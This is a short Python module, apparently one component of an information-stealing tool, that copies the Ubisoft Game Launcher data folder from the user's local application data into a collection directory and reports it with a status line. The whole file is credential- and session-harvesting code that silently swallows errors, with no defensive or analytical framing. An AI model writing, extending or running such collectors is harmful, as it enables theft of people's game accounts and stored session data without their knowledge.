from os import sep,environ
from shutil import copytree
from manager.logger import Log
from preferences.config import config

def Ubisoft():
    try:
        path = r"\Ubisoft Game Launcher"
        msgInfo = ""
        pathtofile = config.pathToLogs
        local = environ["LOCALAPPDATA"]
        copytree(local+ sep + path,f'{pathtofile}\\Games\\Uplay')
        msgInfo+="\n∟🎮Uplay"
        return msgInfo
    except Exception as error:
        Log(f"Ubisoft(Uplay) ---> {error}")
        return msgInfo